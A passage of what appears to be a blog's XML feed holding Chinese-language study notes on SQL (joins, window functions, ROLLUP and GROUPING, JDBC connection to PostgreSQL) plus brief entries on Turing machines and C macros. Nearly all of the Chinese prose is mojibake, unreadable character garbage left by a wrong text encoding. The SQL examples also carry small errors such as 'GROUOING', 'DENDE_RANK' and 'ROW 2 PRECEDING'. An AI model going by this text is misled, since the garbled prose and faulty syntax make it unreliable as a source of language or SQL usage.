è¡¨éƒ½æ˜¯ä¸»è¡¨å—" class="headerlink" title="å¤–è”ç»“è¦ç‚¹2 â€“ æ¯å¼ è¡¨éƒ½æ˜¯ä¸»è¡¨å—?"></a>å¤–è”ç»“è¦ç‚¹2 â€“ æ¯å¼ è¡¨éƒ½æ˜¯ä¸»è¡¨å—?</h4><p>æœ€ç»ˆçš„ç»“æœä¸­ä¼šåŒ…å«ä¸»è¡¨çš„æ‰€æœ‰æ•°æ®ã€‚</p><p>æŒ‡å®šä¸»è¡¨çš„å…³é”®è¯æ˜¯ <code>left</code> å’Œ <code>right</code>.</p><h4 id="3å¼ ä»¥ä¸Šçš„è¡¨çš„è”ç»“"><a href="#3å¼ ä»¥ä¸Šçš„è¡¨çš„è”ç»“" class="headerlink" title="3å¼ ä»¥ä¸Šçš„è¡¨çš„è”ç»“"></a>3å¼ ä»¥ä¸Šçš„è¡¨çš„è”ç»“</h4><p>åŸåˆ™ä¸Šè”ç»“è¡¨çš„æ•°é‡å¹¶æ²¡æœ‰é™åˆ¶ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> ShopProduct <span class="hljs-keyword">as</span> SP <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> Product <span class="hljs-keyword">as</span> P<br>  <span class="hljs-keyword">ON</span> SP.product_id = P.product_id<br>      <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> InventoryProduct <span class="hljs-keyword">as</span> IP<br>          <span class="hljs-keyword">ON</span> SP.product_id = IP.product_id<br></code></pre></td></tr></table></figure><h3 id="äº¤å‰è”ç»“-â€“-CROSS-JOIN-ç¬›å¡å°”ç§¯"><a href="#äº¤å‰è”ç»“-â€“-CROSS-JOIN-ç¬›å¡å°”ç§¯" class="headerlink" title="äº¤å‰è”ç»“ â€“ CROSS JOIN(ç¬›å¡å°”ç§¯)"></a>äº¤å‰è”ç»“ â€“ CROSS JOIN(ç¬›å¡å°”ç§¯)</h3><p>äº¤å‰è”ç»“æ˜¯æ‰€æœ‰è”ç»“çš„åŸºç¡€.</p><p>äº¤å‰è”ç»“æ—¶æ— æ³•ä½¿ç”¨å†…è”ç»“å’Œå¤–è”ç»“ä¸­æ‰€æœ‰çš„ ON å­å¥ï¼Œè¿™æ˜¯å› ä¸ºäº¤å‰è”ç»“æ˜¯å¯¹ä¸¤å¼ è¡¨ä¸­çš„å…¨éƒ¨è®°å½•è¿›è¡Œäº¤å‰ç»„åˆã€‚</p><p>ç»“æœä¸­çš„è®°å½•æ•°é€šå¸¸æ˜¯ä¸¤å¼ è¡¨ä¸­è¡Œæ•°çš„ä¹˜ç§¯ã€‚</p><h3 id="è”ç»“çš„ç‰¹å®šè¯­æ³•å’Œè¿‡æ—¶è¯­æ³•"><a href="#è”ç»“çš„ç‰¹å®šè¯­æ³•å’Œè¿‡æ—¶è¯­æ³•" class="headerlink" title="è”ç»“çš„ç‰¹å®šè¯­æ³•å’Œè¿‡æ—¶è¯­æ³•"></a>è”ç»“çš„ç‰¹å®šè¯­æ³•å’Œè¿‡æ—¶è¯­æ³•</h3><h3 id="å…³ç³»é™¤æ³•"><a href="#å…³ç³»é™¤æ³•" class="headerlink" title="å…³ç³»é™¤æ³•"></a>å…³ç³»é™¤æ³•</h3><p>é›†åˆè¿ç®—ä¸­çš„é™¤æ³•é€šå¸¸ç§°ä¸º<mark>å…³ç³»é™¤æ³•</mark>.</p><h1 id="ç¬¬8ç« -SQLé«˜çº§å¤„ç†"><a href="#ç¬¬8ç« -SQLé«˜çº§å¤„ç†" class="headerlink" title="ç¬¬8ç«  SQLé«˜çº§å¤„ç†"></a>ç¬¬8ç«  SQLé«˜çº§å¤„ç†</h1><h2 id="8-1-çª—å£å‡½æ•°"><a href="#8-1-çª—å£å‡½æ•°" class="headerlink" title="8-1 çª—å£å‡½æ•°"></a>8-1 çª—å£å‡½æ•°</h2><h3 id="ä»€ä¹ˆæ˜¯çª—å£å‡½æ•°"><a href="#ä»€ä¹ˆæ˜¯çª—å£å‡½æ•°" class="headerlink" title="ä»€ä¹ˆæ˜¯çª—å£å‡½æ•°"></a>ä»€ä¹ˆæ˜¯çª—å£å‡½æ•°</h3><p>çª—å£å‡½æ•°ä¹Ÿç§°ä¸ºOLAPå‡½æ•°(Online Analytical Processing).</p><h3 id="çª—å£å‡½æ•°çš„è¯­æ³•"><a href="#çª—å£å‡½æ•°çš„è¯­æ³•" class="headerlink" title="çª—å£å‡½æ•°çš„è¯­æ³•"></a>çª—å£å‡½æ•°çš„è¯­æ³•</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;çª—å£å‡½æ•°&gt; <span class="hljs-keyword">OVER</span> ([<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> &lt;åˆ—æ¸…å•&gt;]<br>                        <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> &lt;æ’åºç”¨åˆ—æ¸…å•&gt;)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œ<code>[]</code>ä¸­çš„å†…å®¹å¯ä»¥çœç•¥ã€‚</p><h4 id="èƒ½å¤Ÿä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„å‡½æ•°"><a href="#èƒ½å¤Ÿä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„å‡½æ•°" class="headerlink" title="èƒ½å¤Ÿä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„å‡½æ•°"></a>èƒ½å¤Ÿä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„å‡½æ•°</h4><p>çª—å£å‡½æ•°å¤§ä½“åˆ†ä¸ºä¸¤ç§:</p><ul><li>èƒ½å¤Ÿä½œä¸ºçª—å£å‡½æ•°çš„èšåˆå‡½æ•°(SUMã€AVGã€COUNTã€MAXã€MIN)</li><li>RANKã€DENSE_RANKã€ROW_NUMBERç­‰ä¸“ç”¨çª—å£å‡½æ•°</li></ul><h3 id="è¯­æ³•çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•-â€“-ä½¿ç”¨-RANK-å‡½æ•°"><a href="#è¯­æ³•çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³•-â€“-ä½¿ç”¨-RANK-å‡½æ•°" class="headerlink" title="è¯­æ³•çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³• â€“ ä½¿ç”¨ RANK å‡½æ•°"></a>è¯­æ³•çš„åŸºæœ¬ä½¿ç”¨æ–¹æ³• â€“ ä½¿ç”¨ RANK å‡½æ•°</h3><p><mark>PARTITION BY</mark> è®¾å®šæ’åºçš„å¯¹è±¡èŒƒå›´ã€‚ç”¨äºåœ¨æ¨ªå‘ä¸Šå¯¹è¡¨è¿›è¡Œåˆ†ç»„ã€‚</p><p><mark>ORDER BY</mark> æŒ‡å®šæŒ‰ç…§å“ªä¸€åˆ—ã€ä½•ç§é¡ºåºè¿›è¡Œæ’åº. ä¸ select è¯­å¥æœ«å°¾çš„ order by ä¸€æ ·ï¼Œå¯ä»¥é€šè¿‡å…³é”®è¯ ASC&#x2F;DESC æ¥æŒ‡å®šå‡åºå’Œé™åºã€‚å†³å®šçºµå‘æ’åºçš„è§„åˆ™ã€‚</p><p>é€šè¿‡ PARTITION BY åˆ†ç»„åçš„è®°å½•çš„é›†åˆå¯ä»¥ç§°ä¸ºçª—å£ã€‚çª—å£çš„æ„æ€ä¸ºèŒƒå›´ã€‚</p><p>çª—å£å‡½æ•°å…¼å…·åˆ†ç»„å’Œæ’åºä¸¤ç§åŠŸèƒ½ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> product_name, product_type, sale_price,<br>       RANK() <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> product_type<br>                         <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> sale_price) <span class="hljs-keyword">AS</span> ranking<br>  <span class="hljs-keyword">FROM</span> Product;<br></code></pre></td></tr></table></figure><h3 id="æ— éœ€æŒ‡å®š-PARTITION-BY"><a href="#æ— éœ€æŒ‡å®š-PARTITION-BY" class="headerlink" title="æ— éœ€æŒ‡å®š PARTITION BY"></a>æ— éœ€æŒ‡å®š PARTITION BY</h3><p>ä¸æŒ‡å®šæ—¶å°†æ•´ä¸ªè¡¨ä½œä¸ºä¸€ä¸ªå¤§çš„çª—å£ä½¿ç”¨.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> product_name, product_type, sale_price,<br>       RANK() <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> sale_price) <span class="hljs-keyword">AS</span> ranking <span class="hljs-keyword">FROM</span> Product;<br></code></pre></td></tr></table></figure><p>å°†è¡¨ä¸­æ•°æ®åˆ†ä¸ºå¤šä¸ªéƒ¨åˆ†æ—¶ä½¿ç”¨ PARTITION BY.</p><h3 id="ä¸“ç”¨çª—å£å‡½æ•°çš„ç§ç±»"><a href="#ä¸“ç”¨çª—å£å‡½æ•°çš„ç§ç±»" class="headerlink" title="ä¸“ç”¨çª—å£å‡½æ•°çš„ç§ç±»"></a>ä¸“ç”¨çª—å£å‡½æ•°çš„ç§ç±»</h3><p>ä»£è¡¨æ€§çš„ä¸“ç”¨çª—å£å‡½æ•°:</p><ul><li>RANKå‡½æ•°, è®¡ç®—æ’åºæ—¶ï¼Œå¦‚æœå­˜åœ¨ç›¸åŒä½æ¬¡çš„è®°å½•ï¼Œåˆ™ä¼šè·³è¿‡ä¹‹åçš„ä½æ¬¡ã€‚å¦‚: 1ä½, 1ä½, 1ä½, 4ä½</li><li>DENDE_RANK, ä¸ä¼šè·³è¿‡ä½æ¬¡.å¦‚:1ä½, 1ä½, 1ä½, 2ä½</li><li>ROW_NUMBERå‡½æ•°ï¼Œèµ‹äºˆå”¯ä¸€çš„è¿ç»­ä½æ¬¡. å¦‚: 1ä½, 2ä½, 3ä½</li></ul><p>ä¸“ç”¨çª—å£å‡½æ•°æ— éœ€å‚æ•°ï¼Œå› æ­¤é€šå¸¸æ‹¬å·ä¸­éƒ½æ˜¯ç©ºçš„ã€‚</p><h3 id="çª—å£å‡½æ•°çš„é€‚ç”¨èŒƒå›´"><a href="#çª—å£å‡½æ•°çš„é€‚ç”¨èŒƒå›´" class="headerlink" title="çª—å£å‡½æ•°çš„é€‚ç”¨èŒƒå›´"></a>çª—å£å‡½æ•°çš„é€‚ç”¨èŒƒå›´</h3><p>åŸåˆ™ä¸Šçª—å£å‡½æ•°åªèƒ½åœ¨ select å­å¥ä¸­ä½¿ç”¨ã€‚</p><p>åœ¨ select å­å¥ä¹‹å¤–â€ä½¿ç”¨çª—å£å‡½æ•°æ˜¯æ²¡æœ‰æ„ä¹‰çš„â€.</p><h3 id="ä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„èšåˆå‡½æ•°"><a href="#ä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„èšåˆå‡½æ•°" class="headerlink" title="ä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„èšåˆå‡½æ•°"></a>ä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„èšåˆå‡½æ•°</h3><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">SELECT</span> product_id, product_name, sale_price, <br>      <span class="hljs-built_in">SUM</span> (sale_price) <span class="hljs-keyword">OVER</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> product_id) <span class="hljs-keyword">AS</span> current_sum <span class="hljs-keyword">FROM</span> Product;<br></code></pre></td></tr></table></figure><p>å½¢æˆ <mark>ç´¯è®¡</mark> çš„ç»Ÿè®¡æ–¹æ³•ã€‚</p><p>ä»¥â€è‡ªèº«è®°å½•(å½“å‰è®°å½•)â€ä½œä¸ºåŸºå‡†è¿›è¡Œç»Ÿè®¡ï¼Œå°±æ˜¯å°†èšåˆå‡½æ•°ä½œä¸ºçª—å£å‡½æ•°ä½¿ç”¨çš„æœ€å¤§ç‰¹å¾ã€‚</p><h3 id="è®¡ç®—ç§»åŠ¨å¹³å‡"><a href="#è®¡ç®—ç§»åŠ¨å¹³å‡" class="headerlink" title="è®¡ç®—ç§»åŠ¨å¹³å‡"></a>è®¡ç®—ç§»åŠ¨å¹³å‡</h3><p>åœ¨çª—å£ä¸­æŒ‡å®šæ›´åŠ è¯¦ç»†çš„æ±‡æ€»èŒƒå›´çš„å¤‡é€‰åŠŸèƒ½ï¼Œå³<mark>æ¡†æ¶</mark>.</p><p>ä¹Ÿå°±æ˜¯å¯ä»¥æŒ‡å®šé‚£å‡ è¡Œè¿›è¡Œæ±‡æ€»ã€‚</p><h4 id="æŒ‡å®šæ¡†æ¶"><a href="#æŒ‡å®šæ¡†æ¶" class="headerlink" title="æŒ‡å®šæ¡†æ¶"></a>æŒ‡å®šæ¡†æ¶</h4><p>ä½¿ç”¨ ROW å’Œ PRECEDING ä¸¤ä¸ªå…³é”®è¯ï¼Œå°†æ¡†æ¶æŒ‡å®šä¸º â€œæˆªæ­¢åˆ°ä¹‹å‰~è¡Œâ€.</p><p>å¦‚â€ROW 2 PRECEDINGâ€:</p><ul><li>è‡ªèº«(å½“å‰è®°å½•)</li><li>ä¹‹å‰1è¡Œçš„è®°å½•</li><li>ä¹‹å‰2è¡Œçš„è®°å½•<br>è¿™æ ·çš„ç»Ÿè®¡æ–¹æ³•ç§°ä¸º<mark>ç§»åŠ¨å¹³å‡</mark>(moving average).</li></ul><p>å…³é”®è¯FOLLOWINGæŒ‡â€æˆªæ­¢åˆ°ä¹‹å~è¡Œâ€.</p><p>ä¸»è¦æ˜¯è¦æ‰¾åˆ°å½“å‰è¡Œã€‚</p><h4 id="å°†å½“å‰è®°å½•çš„å‰åè¡Œä½œä¸ºæ±‡æ€»å¯¹è±¡"><a href="#å°†å½“å‰è®°å½•çš„å‰åè¡Œä½œä¸ºæ±‡æ€»å¯¹è±¡" class="headerlink" title="å°†å½“å‰è®°å½•çš„å‰åè¡Œä½œä¸ºæ±‡æ€»å¯¹è±¡"></a>å°†å½“å‰è®°å½•çš„å‰åè¡Œä½œä¸ºæ±‡æ€»å¯¹è±¡</h4><p>åŒæ—¶ä½¿ç”¨ PRECEDING å’Œ FOLLOWING.</p><h3 id="ä¸¤ä¸ª-ORDER-BY"><a href="#ä¸¤ä¸ª-ORDER-BY" class="headerlink" title="ä¸¤ä¸ª ORDER BY"></a>ä¸¤ä¸ª ORDER BY</h3><p>ä½¿ç”¨çª—å£å‡½æ•°æ—¶å¿…é¡»è¦åœ¨ OVER å­å¥ä¸­ä½¿ç”¨ ORDER BY. ä½†å…¶åªæ˜¯ç”¨æ¥å†³å®šçª—å£å‡½æ•°æŒ‰ç…§ä»€ä¹ˆæ ·çš„é¡ºåºè¿›è¡Œè®¡ç®—ã€‚</p><p>åœ¨ select è¯­å¥çš„æœ€åä½¿ç”¨ order by å­å¥ä¿è¯æ’åºè®°å½•ã€‚</p><h2 id="8-2-GROUPING-è¿ç®—ç¬¦"><a href="#8-2-GROUPING-è¿ç®—ç¬¦" class="headerlink" title="8-2 GROUPING è¿ç®—ç¬¦"></a>8-2 GROUPING è¿ç®—ç¬¦</h2><h3 id="åŒæ—¶å¾—åˆ°åˆè®¡è¡Œ"><a href="#åŒæ—¶å¾—åˆ°åˆè®¡è¡Œ" class="headerlink" title="åŒæ—¶å¾—åˆ°åˆè®¡è¡Œ"></a>åŒæ—¶å¾—åˆ°åˆè®¡è¡Œ</h3><h3 id="ROLLUP-â€“-åŒæ—¶å¾—å‡ºåˆè®¡å’Œå°è®¡"><a href="#ROLLUP-â€“-åŒæ—¶å¾—å‡ºåˆè®¡å’Œå°è®¡" class="headerlink" title="ROLLUP â€“ åŒæ—¶å¾—å‡ºåˆè®¡å’Œå°è®¡"></a>ROLLUP â€“ åŒæ—¶å¾—å‡ºåˆè®¡å’Œå°è®¡</h3><p>GROUPING è¿ç®—ç¬¦åŒ…å«ä»¥ä¸‹3ç§:</p><ul><li>ROLLUP</li><li>CUBE</li><li>GROUPING SETS</li></ul><h4 id="ROLLUP-çš„ä½¿ç”¨æ–¹æ³•"><a href="#ROLLUP-çš„ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ROLLUP çš„ä½¿ç”¨æ–¹æ³•"></a>ROLLUP çš„ä½¿ç”¨æ–¹æ³•</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> product_type, SUM(sale_price) <span class="hljs-keyword">AS</span> sum_price<br>    <span class="hljs-keyword">FROM</span> Product<br>  <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">ROLLUP</span>(product_type);<br></code></pre></td></tr></table></figure><p>GROUP BY() è¢«ç§°ä¸º<mark>è¶…çº§åˆ†ç»„è®°å½•(super group row)</mark>.</p><p>è¶…çº§åˆ†ç»„è®°å½•é»˜è®¤ä½¿ç”¨ NULL ä½œä¸ºèšåˆé”®ã€‚</p><h4 id="å°†â€ç™»è®°æ—¥æœŸâ€æ·»åŠ åˆ°èšåˆé”®ä¸­"><a href="#å°†â€ç™»è®°æ—¥æœŸâ€æ·»åŠ åˆ°èšåˆé”®ä¸­" class="headerlink" title="å°†â€ç™»è®°æ—¥æœŸâ€æ·»åŠ åˆ°èšåˆé”®ä¸­"></a>å°†â€ç™»è®°æ—¥æœŸâ€æ·»åŠ åˆ°èšåˆé”®ä¸­</h4><h3 id="GROUPINGå‡½æ•°-â€“-è®©NULLæ›´åŠ å®¹æ˜“åˆ†è¾¨"><a href="#GROUPINGå‡½æ•°-â€“-è®©NULLæ›´åŠ å®¹æ˜“åˆ†è¾¨" class="headerlink" title="GROUPINGå‡½æ•° â€“ è®©NULLæ›´åŠ å®¹æ˜“åˆ†è¾¨"></a>GROUPINGå‡½æ•° â€“ è®©NULLæ›´åŠ å®¹æ˜“åˆ†è¾¨</h3><p><code>GROUPING</code>å‡½æ•° â€“ ç”¨æ¥åˆ¤æ–­è¶…çº§åˆ†ç»„è®°å½•çš„ NULL çš„ç‰¹å®šå‡½æ•°ã€‚</p><p>åœ¨å…¶å‚æ•°åˆ—çš„å€¼ä¸ºè¶…çº§åˆ†ç»„è®°å½•æ‰€äº§ç”Ÿçš„ NULL æ—¶è¿”å›1ï¼Œå…¶ä»–æƒ…å†µè¿”å›0.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> GROUOING(product_type) <span class="hljs-keyword">AS</span> product_type<br>        GROUPING(regist_date) <span class="hljs-keyword">AS</span> regist_date, SUM(sale_price) <span class="hljs-keyword">AS</span> sum_price<br>        <span class="hljs-keyword">FROM</span> Product<br>      <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">ROLLUP</span>(product_type, regist_date);<br></code></pre></td></tr></table></figure><h3 id="CUBE-â€“-ç”¨æ•°æ®æ¥æ­ç§¯æœ¨"><a href="#CUBE-â€“-ç”¨æ•°æ®æ¥æ­ç§¯æœ¨" class="headerlink" title="CUBE â€“ ç”¨æ•°æ®æ¥æ­ç§¯æœ¨"></a>CUBE â€“ ç”¨æ•°æ®æ¥æ­ç§¯æœ¨</h3><h1 id="ç¬¬9ç« -é€šè¿‡åº”ç”¨ç¨‹åºè¿æ¥æ•°æ®åº“"><a href="#ç¬¬9ç« -é€šè¿‡åº”ç”¨ç¨‹åºè¿æ¥æ•°æ®åº“" class="headerlink" title="ç¬¬9ç«  é€šè¿‡åº”ç”¨ç¨‹åºè¿æ¥æ•°æ®åº“"></a>ç¬¬9ç«  é€šè¿‡åº”ç”¨ç¨‹åºè¿æ¥æ•°æ®åº“</h1><h2 id="9-1-æ•°æ®åº“ä¸–ç•Œå’Œåº”ç”¨ç¨‹åºä¸–ç•Œçš„è¿æ¥"><a href="#9-1-æ•°æ®åº“ä¸–ç•Œå’Œåº”ç”¨ç¨‹åºä¸–ç•Œçš„è¿æ¥" class="headerlink" title="9-1 æ•°æ®åº“ä¸–ç•Œå’Œåº”ç”¨ç¨‹åºä¸–ç•Œçš„è¿æ¥"></a>9-1 æ•°æ®åº“ä¸–ç•Œå’Œåº”ç”¨ç¨‹åºä¸–ç•Œçš„è¿æ¥</h2><h3 id="æ•°æ®åº“å’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„å…³ç³»"><a href="#æ•°æ®åº“å’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„å…³ç³»" class="headerlink" title="æ•°æ®åº“å’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„å…³ç³»"></a>æ•°æ®åº“å’Œåº”ç”¨ç¨‹åºä¹‹é—´çš„å…³ç³»</h3><p>ç³»ç»Ÿ &#x3D; åº”ç”¨ + æ•°æ®åº“</p><h3 id="é©±åŠ¨-â€“-ä¸¤ä¸ªä¸–ç•Œä¹‹é—´çš„æ¡¥æ¢"><a href="#é©±åŠ¨-â€“-ä¸¤ä¸ªä¸–ç•Œä¹‹é—´çš„æ¡¥æ¢" class="headerlink" title="é©±åŠ¨ â€“ ä¸¤ä¸ªä¸–ç•Œä¹‹é—´çš„æ¡¥æ¢"></a>é©±åŠ¨ â€“ ä¸¤ä¸ªä¸–ç•Œä¹‹é—´çš„æ¡¥æ¢</h3><p>é©±åŠ¨ï¼Œå®é™…ä¸Šå°±æ˜¯è¿æ¥çš„æ„æ€ã€‚</p><p>é©±åŠ¨ï¼Œç”¨äºè§£å†³æ›´æ¢ç¼–ç¨‹è¯­è¨€æˆ–è€…DBMSè€Œå¯¼è‡´ä»å¤´å¼€å§‹ä¿®æ”¹åº”ç”¨å’ŒSQLè¯­å¥ã€‚</p><p>é©±åŠ¨æ˜¯ç”¨æ¥è¿æ¥åº”ç”¨å’Œæ•°æ®åº“çš„éå¸¸å°çš„ç‰¹æ®Šç¨‹åºã€‚</p><h3 id="é©±åŠ¨çš„ç§ç±»"><a href="#é©±åŠ¨çš„ç§ç±»" class="headerlink" title="é©±åŠ¨çš„ç§ç±»"></a>é©±åŠ¨çš„ç§ç±»</h3><p>DBMS å’Œç¼–ç¨‹è¯­è¨€çš„ä¸åŒï¼Œä½¿ç”¨çš„é©±åŠ¨ç¨‹åºä¹Ÿä¸ä¸€æ ·ã€‚</p><p>ç°åœ¨å¹¿æ³›ä½¿ç”¨çš„é©±åŠ¨æ ‡å‡†ä¸»è¦æœ‰ ODBC(Open DataBase Connectivity) å’Œ JDBC(Java Data Base Connectivity).</p><p><a href="https://jdbc.postgresql.org/download.html">ä¸‹è½½ Driver çš„ç½‘ç«™</a></p><p><code>.jar</code> æ‰©å±•åæ˜¯ Java çš„å¯æ‰§è¡Œæ–‡ä»¶çš„æ‰©å±•åã€‚</p><h2 id="9-2-Java-åŸºç¡€çŸ¥è¯†"><a href="#9-2-Java-åŸºç¡€çŸ¥è¯†" class="headerlink" title="9-2  Java åŸºç¡€çŸ¥è¯†"></a>9-2  Java åŸºç¡€çŸ¥è¯†</h2><p><code>src</code> æ˜¯ <code>æºä»£ç </code>(source) çš„ç®€ç§°ã€‚</p><p>SQL ä¸­çš„å­—ç¬¦ä¸²æ˜¯ä½¿ç”¨å•å¼•å·(â€˜)æ‹¬èµ·æ¥çš„ã€‚</p><h3 id="ç¼–è¯‘å’Œç¨‹åºæ‰§è¡Œ"><a href="#ç¼–è¯‘å’Œç¨‹åºæ‰§è¡Œ" class="headerlink" title="ç¼–è¯‘å’Œç¨‹åºæ‰§è¡Œ"></a>ç¼–è¯‘å’Œç¨‹åºæ‰§è¡Œ</h3><p>ä½¿ç”¨ javac è¿›è¡Œç¼–è¯‘:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">javac</span> <span class="hljs-regexp">*.java</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘æˆåŠŸåä¼šç”Ÿæˆ<code>.class</code>æ–‡ä»¶ï¼Œå…¶ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œç§°ä¸ºâ€ç±»æ–‡ä»¶â€.</p><h4 id="ä½¿ç”¨-java-å‘½ä»¤æ‰§è¡Œç¨‹åº"><a href="#ä½¿ç”¨-java-å‘½ä»¤æ‰§è¡Œç¨‹åº" class="headerlink" title="ä½¿ç”¨ java å‘½ä»¤æ‰§è¡Œç¨‹åº"></a>ä½¿ç”¨ java å‘½ä»¤æ‰§è¡Œç¨‹åº</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">java <span class="hljs-tag">&lt;<span class="hljs-name">ç±»å</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å¸¸è§é”™è¯¯"><a href="#å¸¸è§é”™è¯¯" class="headerlink" title="å¸¸è§é”™è¯¯"></a>å¸¸è§é”™è¯¯</h3><h4 id="å¤§å°å†™é”™è¯¯"><a href="#å¤§å°å†™é”™è¯¯" class="headerlink" title="å¤§å°å†™é”™è¯¯"></a>å¤§å°å†™é”™è¯¯</h4><p>Java åŒºåˆ†å¤§å°å†™ã€‚</p><h4 id="ä½¿ç”¨å…¨è§’ç©ºæ ¼"><a href="#ä½¿ç”¨å…¨è§’ç©ºæ ¼" class="headerlink" title="ä½¿ç”¨å…¨è§’ç©ºæ ¼"></a>ä½¿ç”¨å…¨è§’ç©ºæ ¼</h4><p>æºä»£ç ä¸­ä¸èƒ½ä½¿ç”¨å…¨è§’ç©ºæ ¼ã€‚</p><h4 id="æºæ–‡ä»¶çš„æ–‡ä»¶åå’Œç±»åä¸ä¸€è‡´"><a href="#æºæ–‡ä»¶çš„æ–‡ä»¶åå’Œç±»åä¸ä¸€è‡´" class="headerlink" title="æºæ–‡ä»¶çš„æ–‡ä»¶åå’Œç±»åä¸ä¸€è‡´"></a>æºæ–‡ä»¶çš„æ–‡ä»¶åå’Œç±»åä¸ä¸€è‡´</h4><p>æ–‡ä»¶åå¿…é¡»å’Œæºä»£ç ç¬¬1è¡Œçš„ç±»åä¸€è‡´ã€‚</p><h4 id="å‘½ä»¤åå’Œæ–‡ä»¶åé”™è¯¯"><a href="#å‘½ä»¤åå’Œæ–‡ä»¶åé”™è¯¯" class="headerlink" title="å‘½ä»¤åå’Œæ–‡ä»¶åé”™è¯¯"></a>å‘½ä»¤åå’Œæ–‡ä»¶åé”™è¯¯</h4><h2 id="9-3-é€šè¿‡-Java-è”ç»“-PostgreSQL"><a href="#9-3-é€šè¿‡-Java-è”ç»“-PostgreSQL" class="headerlink" title="9-3 é€šè¿‡ Java è”ç»“ PostgreSQL"></a>9-3 é€šè¿‡ Java è”ç»“ PostgreSQL</h2><h3 id="æ‰§è¡Œ-SQL-è¯­å¥çš„-Java-ç¨‹åº"><a href="#æ‰§è¡Œ-SQL-è¯­å¥çš„-Java-ç¨‹åº" class="headerlink" title="æ‰§è¡Œ SQL è¯­å¥çš„ Java ç¨‹åº"></a>æ‰§è¡Œ SQL è¯­å¥çš„ Java ç¨‹åº</h3><h3 id="Java-æ˜¯å¦‚ä½•ä»æ•°æ®åº“ä¸­è·å–æ•°æ®çš„"><a href="#Java-æ˜¯å¦‚ä½•ä»æ•°æ®åº“ä¸­è·å–æ•°æ®çš„" class="headerlink" title="Java æ˜¯å¦‚ä½•ä»æ•°æ®åº“ä¸­è·å–æ•°æ®çš„"></a>Java æ˜¯å¦‚ä½•ä»æ•°æ®åº“ä¸­è·å–æ•°æ®çš„</h3>]]></content>
    
    
    <categories>
      
      <category>SQL</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å›¾çµæœº</title>
    <link href="/2022/08/07/%E5%9B%BE%E7%81%B5%E6%9C%BA/"/>
    <url>/2022/08/07/%E5%9B%BE%E7%81%B5%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p><a href="https://baike.baidu.com/item/%E5%9B%BE%E7%81%B5%E6%9C%BA/2112989?fr=aladdin">reference</a></p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å® å­¦ä¹  Notes</title>
    <link href="/2022/08/07/%E5%AE%8F-%E5%AD%A6%E4%B9%A0-Notes/"/>
    <url>/2022/08/07/%E5%AE%8F-%E5%AD%A6%E4%B9%A0-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="https://onevcat.com/2014/01/black-magic-in-macro/">reference</a></p><h1 id="å…¥é—¨"><a href="#å…¥é—¨" class="headerlink" title="å…¥é—¨"></a>å…¥é—¨</h1><p>Cä¸­å®åˆ†ä¸¤ç±»: </p><ul><li>å¯¹è±¡å®(object-like macro)</li><li>å‡½æ•°å®(function-like macro)</li></ul>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
